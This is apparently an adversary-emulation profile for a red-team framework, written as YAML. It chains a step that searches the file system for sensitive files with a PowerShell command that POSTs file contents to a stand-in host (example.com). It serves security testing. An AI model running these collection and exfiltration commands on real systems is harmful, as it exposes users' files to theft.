adversary_id: custom_adversary_profile__APT_3__APT3_Phase3_Pattern_2__2023-10-19-22_37_41
name: Custom Adversary Profile
description: [['stockpile__collection', 'atomic__collection'], ['stockpile__exfiltration', 'atomic__exfiltration']]
atomic_ordering:
- 90c2efaa-8205-480d-8bb6-61d90dbaf81b # ('90c2efaa-8205-480d-8bb6-61d90dbaf81b', 'None', 'host.file.path') ; {'description': 'Locate files deemed sensitive', 'tactic': 'collection', 'technique': {'attack_id': 'T1005', 'name': 'Data from Local System'}, 'platforms': {'darwin': {'sh': {'command': "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.file.path', 'edge': 'has_extension', 'target': 'file.sensitive.extension'}]}}}, 'windows': {'psh,pwsh': {'command': "Get-ChildItem C:\\Users -Recurse -Include *.#{file.sensitive.extension} -ErrorAction 'SilentlyContinue' | foreach {$_.FullName} | Select-Object -first 5;\nexit 0;\n", 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.file.path', 'edge': 'has_extension', 'target': 'file.sensitive.extension'}]}}}, 'linux': {'sh': {'command': "find / -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n", 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.file.path', 'edge': 'has_extension', 'target': 'file.sensitive.extension'}]}}}}, 'id__dependence__fact': ['90c2efaa-8205-480d-8bb6-61d90dbaf81b', 'None', 'host.file.path'], 'plugin': 'stockpile'}
- ac4d31cae06889fe70ed9464748c970a # ('ac4d31cae06889fe70ed9464748c970a', 'None', 'validate_me') ; {'description': 'Exfiltrates a file present on the victim machine to the C2 server.\n', 'tactic': 'exfiltration', 'technique': {'attack_id': 'T1041', 'name': 'Exfiltration Over C2 Channel'}, 'platforms': {'windows': {'psh': {'cleanup': '', 'command': 'if(-not (Test-Path $env:TEMP\\LineNumbers.txt)){ ;   1..100 | ForEach-Object { Add-Content -Path $env:TEMP\\LineNumbers.txt -Value "This is line $_." }; }; [System.Net.ServicePointManager]::Expect100Continue = $false; $filecontent = Get-Content -Path $env:TEMP\\LineNumbers.txt; Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['ac4d31cae06889fe70ed9464748c970a', 'None', 'validate_me'], 'plugin': 'atomic'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []